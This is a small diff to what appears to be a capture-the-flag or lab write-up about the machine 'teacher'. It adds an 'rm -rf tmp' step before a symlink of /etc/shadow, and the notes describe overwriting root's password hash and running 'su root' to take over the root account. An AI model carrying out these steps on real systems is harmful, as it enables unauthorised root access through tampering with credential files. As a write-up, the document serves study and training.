@@ -373,6 +373,7 @@ Notes: After "cd" into "tmp". chmod is called to give rwx permissions to anyone 
 
 
 giovanni@teacher:/dev/shm$ cd ~/work
+giovanni@teacher:/home/giovanni/work$ rm -rf tmp
 giovanni@teacher:/home/giovanni/work$ ln -s /etc/shadow /home/giovanni/work/tmp
 Notes: Nano'd into /etc/shadow and replaced the root hash with giovanni's hash.
 giovanni@teacher:/home/giovanni/work$ su root
